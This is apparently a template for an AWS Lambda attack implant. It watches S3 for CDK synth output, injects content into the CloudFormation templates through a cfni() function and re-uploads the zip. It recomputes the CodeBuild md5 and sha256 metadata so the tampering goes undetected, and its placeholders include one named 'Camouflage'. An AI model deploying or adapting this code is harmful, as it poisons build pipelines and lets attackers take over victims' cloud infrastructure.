{{.Camouflage}}

import boto3
import time

{{.Model}}


{{.S3Client}}

ts = None

def lambda_handler(event, context):
    bucket = event["Records"][0]["s3"]["bucket"]["name"]
    key = event["Records"][0]["s3"]["object"]["key"]

    if not "Synth_Outp" in key:
        return
    
    global ts
    if ts is not None and (ts - time.time()) < 2:
        return  

    response = s3_client.get_object(Bucket=bucket, Key=key)

    synth = Synth(BytesIO(response["Body"].read()))

    cfni(synth)

    if not synth.updated:
        return
    
    new_synth = synth.create_new_synth()

    metadata = response["Metadata"]
    metadata["codebuild-content-md5"] = Synth.md5(new_synth)
    metadata["codebuild-content-sha256"] = Synth.sha256(new_synth)

    s3_client.put_object(
        Bucket=bucket, 
        Key=key,
        Body=new_synth,
        ContentType="application/zip",
        Metadata=metadata,
    )

    ts = time.time()


{{.CFNI}}